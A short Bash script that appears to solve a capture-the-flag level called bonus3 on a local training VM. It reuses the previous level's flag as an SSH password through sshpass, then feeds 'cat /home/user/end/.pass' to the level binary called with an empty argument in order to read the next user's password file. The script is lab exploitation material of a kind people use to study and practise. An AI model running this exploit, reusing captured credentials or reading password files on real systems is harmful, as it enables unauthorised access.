#!/bin/bash

VM_ID='192.168.56.5'
ACTUAL_BONUS=$(echo "$0" | grep --only --color=never --max-count=1 "bonus[0-9].sh" | head --lines=1 | grep --only --color=never --max-count=1 '[0-9]' | head --lines=1)

if [ -z "${ACTUAL_BONUS}" ]; then
    echo "cannot get the bonus number of the actua bonus"
    exit 1
fi

PREVIOUS_BONUS="$(( "${ACTUAL_BONUS}" - 1))"

if [ ! -f "../../bonus${PREVIOUS_BONUS}/flag" ]; then
    echo "../../bonus${PREVIOUS_BONUS}/flag does not exist"
    exit 1
fi

act_bonus_password=$(cat "../../bonus${PREVIOUS_BONUS}/flag")

flag=$(sshpass -p "${act_bonus_password}" ssh bonus${ACTUAL_BONUS}@${VM_ID} -p 4242 'echo "cat /home/user/end/.pass" | ./bonus3 ""' 2> /dev/null)

echo -e "FLAG:\n${flag}"
